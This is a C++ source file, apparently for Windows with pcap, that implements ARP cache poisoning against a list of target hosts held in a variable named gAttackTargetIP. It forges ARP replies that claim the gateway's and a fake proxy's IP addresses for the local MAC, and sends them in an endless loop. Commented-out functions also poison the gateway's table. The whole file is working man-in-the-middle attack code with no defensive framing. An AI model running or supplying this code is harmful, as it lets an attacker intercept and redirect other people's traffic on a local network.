

#include "ArpCheat.h"
#include "ClientAddress.h"
#include "Packet.h"
#include "PublicUtils.h"



#define RARP_BROADCAST_TIMEDELAY 1000



int ArpCheat::makeFakeClient(pcap_t * pcapt,unsigned int ip,unsigned char mac[MAC_ADDRESS_SIZE]) {
	int Result = 0;
	unsigned char	ArpPacket[1024] = { 0 };
	LPMACHEADER		MACheader = (LPMACHEADER)ArpPacket;
	LPARPHEADER		ARPheader = (LPARPHEADER)(ArpPacket + sizeof(MACHEADER));

	memmove((char*)MACheader->DstMAC, mac, MAC_ADDRESS_SIZE);
	memmove((char*)MACheader->SrcMAC, (char*)gLocalMAC, MAC_ADDRESS_SIZE);
	MACheader->Protocol = 0x0608;
	ARPheader->HardWareType = 0x0100;
	ARPheader->ProtocolType = 0x0008;
	ARPheader->HardWareSize = MAC_ADDRESS_SIZE;
	ARPheader->ProtocolSize = 4;
	ARPheader->Opcode = 0x0200;
	memmove((char*)ARPheader->SenderMac, (char*)gLocalMAC, MAC_ADDRESS_SIZE);
	memmove(ARPheader->SenderIP, (unsigned char *)&(gFakeProxyIP), sizeof(DWORD));
	memmove((char*)ARPheader->RecverMac, mac, MAC_ADDRESS_SIZE);
	memmove(ARPheader->RecverIP, (unsigned char *)&(ip), sizeof(DWORD));
	Result = pcap_sendpacket((pcap_t*)pcapt, ArpPacket, sizeof(MACHEADER) + sizeof(ARPHEADER));
	if (Result)
	{
		printf("ThreadArpCheat pcap_sendpacket error\n");
	}

	return Result;
}






int ArpCheat::sendRarps(pcap_t *pt) {
	int iRet = 0;
	unsigned char	ArpPacket[1024] = { 0 };
	LPMACHEADER		MACheader = (LPMACHEADER)ArpPacket;
	LPARPHEADER		ARPheader = (LPARPHEADER)(ArpPacket + sizeof(MACHEADER));

	int cnt = gAttackTargetIP.size();
	for (int i = 0; i < cnt; i++)
	{
		if (gAttackTargetIP[i].clientIP == 0 || memcmp(gAttackTargetIP[i].clientMAC, "\x00\x00\x00\x00\x00\x00", 6) == 0)
		{
			continue;
		}

		memmove((char*)MACheader->DstMAC, gAttackTargetIP[i].clientMAC, MAC_ADDRESS_SIZE);
		memmove((char*)MACheader->SrcMAC, (char*)gLocalMAC, MAC_ADDRESS_SIZE);
		MACheader->Protocol = 0x0608;
		ARPheader->HardWareType = 0x0100;
		ARPheader->ProtocolType = 0x0008;
		ARPheader->HardWareSize = MAC_ADDRESS_SIZE;
		ARPheader->ProtocolSize = 4;
		ARPheader->Opcode = 0x0200;
		memmove((char*)ARPheader->SenderMac, (char*)gLocalMAC, MAC_ADDRESS_SIZE);
		memmove(ARPheader->SenderIP, (unsigned char *)&(gGatewayIP), sizeof(DWORD));
		memmove((char*)ARPheader->RecverMac, gAttackTargetIP[i].clientMAC, MAC_ADDRESS_SIZE);
		memmove(ARPheader->RecverIP, (unsigned char *)&(gAttackTargetIP[i].clientIP), sizeof(DWORD));
		iRet = pcap_sendpacket((pcap_t*)pt, ArpPacket, sizeof(MACHEADER) + sizeof(ARPHEADER) );
		if (iRet)
		{
			printf("ThreadArpCheat pcap_sendpacket error\n");
		}

		//here
		iRet = makeFakeClient(pt, gAttackTargetIP[i].clientIP, gAttackTargetIP[i].clientMAC);
	}

	return iRet;
}


int __stdcall ArpCheat::ArpCheatProc(pcap_t * pcap) {
	int iRet = 0;

	while (1)
	{
		iRet = sendRarps((pcap_t*)pcap);
		//iRet = adjustSelf((pcap_t*)pcap);

		Sleep(gArpDelay);
	}

	return TRUE;
}



int ArpCheat::broadcastArp(pcap_t * pcapt, unsigned int ip) {
	int Result = 0;
	unsigned char	ArpPacket[1024] = { 0 };
	LPMACHEADER		MACheader = (LPMACHEADER)ArpPacket;
	LPARPHEADER		ARPheader = (LPARPHEADER)(ArpPacket + sizeof(MACHEADER));

	memmove((char*)MACheader->DstMAC, BROADCAST_MAC_ADDRESS, MAC_ADDRESS_SIZE);
	memmove((char*)MACheader->SrcMAC, (char*)gLocalMAC, MAC_ADDRESS_SIZE);
	MACheader->Protocol = 0x0608;
	ARPheader->HardWareType = 0x0100;
	ARPheader->ProtocolType = 0x0008;
	ARPheader->HardWareSize = MAC_ADDRESS_SIZE;
	ARPheader->ProtocolSize = 4;
	ARPheader->Opcode = 0x0100;
	memmove((char*)ARPheader->SenderMac, (char*)gLocalMAC, MAC_ADDRESS_SIZE);
	memmove(ARPheader->SenderIP, (unsigned char *)&(gLocalIP), sizeof(DWORD));
	memmove((char*)ARPheader->RecverMac, ZERO_MAC_ADDRESS, MAC_ADDRESS_SIZE);
	memmove(ARPheader->RecverIP, (unsigned char *)&(ip), sizeof(DWORD));
	Result = pcap_sendpacket((pcap_t*)pcapt, ArpPacket, sizeof(MACHEADER) + sizeof(ARPHEADER));
	if (Result)
	{
		printf("ThreadArpCheat pcap_sendpacket error\n");
	}

	return Result;
}




int ArpCheat::arpReply(pcap_t * pcapt, unsigned int senederip, unsigned char sendermac[MAC_ADDRESS_SIZE],unsigned int recverip,unsigned char * recvermac) 
{
	int Result = 0;
	unsigned char	ArpPacket[1024] = { 0 };
	LPMACHEADER		MACheader = (LPMACHEADER)ArpPacket;
	LPARPHEADER		ARPheader = (LPARPHEADER)(ArpPacket + sizeof(MACHEADER));

	memmove((char*)MACheader->DstMAC, recvermac, MAC_ADDRESS_SIZE);
	memmove((char*)MACheader->SrcMAC, (char*)sendermac, MAC_ADDRESS_SIZE);
	MACheader->Protocol = 0x0608;
	ARPheader->HardWareType = 0x0100;
	ARPheader->ProtocolType = 0x0008;
	ARPheader->HardWareSize = MAC_ADDRESS_SIZE;
	ARPheader->ProtocolSize = 4;
	ARPheader->Opcode = 0x0200;
	memmove((char*)ARPheader->SenderMac, (char*)sendermac, MAC_ADDRESS_SIZE);
	memmove(ARPheader->SenderIP, (unsigned char *)&(senederip), sizeof(DWORD));
	memmove((char*)ARPheader->RecverMac, recvermac, MAC_ADDRESS_SIZE);
	memmove(ARPheader->RecverIP, (unsigned char *)&(recverip), sizeof(DWORD));
	Result = pcap_sendpacket((pcap_t*)pcapt, ArpPacket, sizeof(MACHEADER) + sizeof(ARPHEADER));
	if (Result)
	{
		printf("ThreadArpCheat pcap_sendpacket error\n");
	}

	return Result;
}










/*



int ArpCheat::refreshGatewayArpList(pcap_t * pcapt, unsigned int ip, unsigned char mac[MAC_ADDRESS_SIZE]) {
int Result = 0;
unsigned char	ArpPacket[1024] = { 0 };
LPMACHEADER		MACheader = (LPMACHEADER)ArpPacket;
LPARPHEADER		ARPheader = (LPARPHEADER)(ArpPacket + sizeof(MACHEADER));

memmove((char*)MACheader->DstMAC, gGatewayMAC, MAC_ADDRESS_SIZE);
memmove((char*)MACheader->SrcMAC, (char*)gLocalMAC, MAC_ADDRESS_SIZE);
MACheader->Protocol = 0x0608;
ARPheader->HardWareType = 0x0100;
ARPheader->ProtocolType = 0x0008;
ARPheader->HardWareSize = MAC_ADDRESS_SIZE;
ARPheader->ProtocolSize = 4;
ARPheader->Opcode = 0x0200;
memmove((char*)ARPheader->SenderMac, (char*)gLocalMAC, MAC_ADDRESS_SIZE);
memmove(ARPheader->SenderIP, (unsigned char *)&(ip), sizeof(DWORD));
memmove((char*)ARPheader->RecverMac, gGatewayMAC, MAC_ADDRESS_SIZE);
memmove(ARPheader->RecverIP, (unsigned char *)&(gGatewayIP), sizeof(DWORD));
Result = pcap_sendpacket((pcap_t*)pcapt, ArpPacket, sizeof(MACHEADER) + sizeof(ARPHEADER));
if (Result)
{
printf("ThreadArpCheat pcap_sendpacket error\n");
}

return Result;
}


int ArpCheat::sendRarp(pcap_t * pcapt,unsigned int ip,unsigned char mac[MAC_ADDRESS_SIZE]) {
int Result = 0;
unsigned char	ArpPacket[1024] = { 0 };
LPMACHEADER		MACheader = (LPMACHEADER)ArpPacket;
LPARPHEADER		ARPheader = (LPARPHEADER)(ArpPacket + sizeof(MACHEADER));

memmove((char*)MACheader->DstMAC, mac, MAC_ADDRESS_SIZE);
memmove((char*)MACheader->SrcMAC, (char*)gLocalMAC, MAC_ADDRESS_SIZE);
MACheader->Protocol = 0x0608;
ARPheader->HardWareType = 0x0100;
ARPheader->ProtocolType = 0x0008;
ARPheader->HardWareSize = MAC_ADDRESS_SIZE;
ARPheader->ProtocolSize = 4;
ARPheader->Opcode = 0x0200;
memmove((char*)ARPheader->SenderMac, (char*)gLocalMAC, MAC_ADDRESS_SIZE);
memmove(ARPheader->SenderIP, (unsigned char *)&(gGatewayIP), sizeof(DWORD));
memmove((char*)ARPheader->RecverMac, mac, MAC_ADDRESS_SIZE);
memmove(ARPheader->RecverIP, (unsigned char *)&(ip), sizeof(DWORD));
Result = pcap_sendpacket((pcap_t*)pcapt, ArpPacket, sizeof(MACHEADER) + sizeof(ARPHEADER));
if (Result)
{
printf("ThreadArpCheat pcap_sendpacket error\n");
}

return Result;
}







int ArpCheat::adjustSelf(pcap_t * pcapt) {
int Result = 0;
unsigned char	ArpPacket[1024] = { 0 };
LPMACHEADER		MACheader = (LPMACHEADER)ArpPacket;
LPARPHEADER		ARPheader = (LPARPHEADER)(ArpPacket + sizeof(MACHEADER));

memmove((char*)MACheader->DstMAC, gLocalMAC, MAC_ADDRESS_SIZE);
memmove((char*)MACheader->SrcMAC, (char*)gGatewayMAC, MAC_ADDRESS_SIZE);
MACheader->Protocol = 0x0608;
ARPheader->HardWareType = 0x0100;
ARPheader->ProtocolType = 0x0008;
ARPheader->HardWareSize = MAC_ADDRESS_SIZE;
ARPheader->ProtocolSize = 4;
ARPheader->Opcode = 0x0200;
memmove((char*)ARPheader->SenderMac, (char*)gGatewayMAC, MAC_ADDRESS_SIZE);
memmove(ARPheader->SenderIP, (unsigned char *)&(gGatewayIP), sizeof(DWORD));
memmove((char*)ARPheader->RecverMac, gLocalMAC, MAC_ADDRESS_SIZE);
memmove(ARPheader->RecverIP, (unsigned char *)&(gLocalIP), sizeof(DWORD));
Result = pcap_sendpacket((pcap_t*)pcapt, ArpPacket, sizeof(MACHEADER) + sizeof(ARPHEADER));
if (Result)
{
printf("ThreadArpCheat pcap_sendpacket error\n");
}

return Result;
}
*/